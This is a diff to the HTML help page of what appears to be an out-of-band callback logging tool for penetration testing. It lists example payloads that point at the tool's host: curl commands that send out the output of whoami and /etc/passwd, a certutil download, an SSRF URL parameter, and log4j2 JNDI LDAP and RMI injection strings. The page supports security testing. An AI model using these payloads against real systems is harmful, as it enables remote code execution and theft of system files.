@@ -35,23 +35,24 @@
             </div>
             <div class="post">
               <h2><a href="/#/httplog/index">Httplog</a></h2>
-              Support GET POST HEAD request.
+              Now juse support GET POST HEAD request
               <br>
               <p>
                 RCE:
-                <code>curl `whoami`.{{ http }}</code>
+                <code>curl http://{{ http }}/{{ logid }}/xxx</code>
                 &nbsp;
-                <code>curl -d @/etc/passwd {{ http }}</code>
+                <code>curl -d @/etc/passwd http://{{ http }}/{{ logid }}/xxx</code>
                 &nbsp;
                 <code>certutil -urlcache -split -f
-                  http://{{ http }}/x x</code>
+                  http://{{ http }}/{{ logid }}/xxx xxx</code>
                 <br>
                 SSRF:
-                <code>?url=http://{{ http }}/x</code>
+                <code>?url=http://{{ http }}/{{ logid }}/xxx</code>
               </p>
             </div>
             <div class="post">
               <h2><a href="/#/ldaplog/index">Ldaplog</a></h2>
+              Need end with <code style="margin:0; padding:0;">{{ logid }}</code>
               <p>
                 log4j2:
                 <code>${jndi:ldap://{{ ldap }}/xxxx{{ logid }}}</code>
@@ -63,6 +64,7 @@
             </div>
             <div class="post">
               <h2><a href="/#/rmilog/index">Rmilog</a></h2>
+              Need end with <code style="margin:0; padding:0;">{{ logid }}</code>
               <p>
                 log4j2:
                 <code>${jndi:rmi://{{ rmi }}/xxxx{{ logid }}}</code>
